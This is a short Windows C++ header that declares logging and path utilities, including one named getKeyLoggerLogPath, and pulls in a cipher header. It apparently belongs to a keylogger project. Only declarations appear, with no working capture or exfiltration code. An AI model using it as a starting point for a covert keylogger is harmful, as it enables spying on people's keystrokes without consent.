#include <iostream>
#include <Windows.h>
#include <ctime>
#include <fstream>

#ifndef _CIPHER_HPP_
#define _CIPHER_HPP_
#include "cipher.hpp"
#endif

// Save Log
/**
 *      Write Log to Log File
 *      @param toLog    String to log
 *      @param LogPath  Path of file
 *      @param status   Status(stdout/stderr)
 *      @return Boolean - Success or not
 */
bool writeLog(std::string toLog, std::string LogPath);
bool writeLog(std::string toLog, std::string LogPath, std::string status);
std::string TCHAR_2_String(TCHAR tchr[], DWORD length);
LPCWSTR String_2_LPCWSTR(std::string str);
std::string getCurrentPath();
std::string getStandardLogPath();
std::string getKeyLoggerLogPath();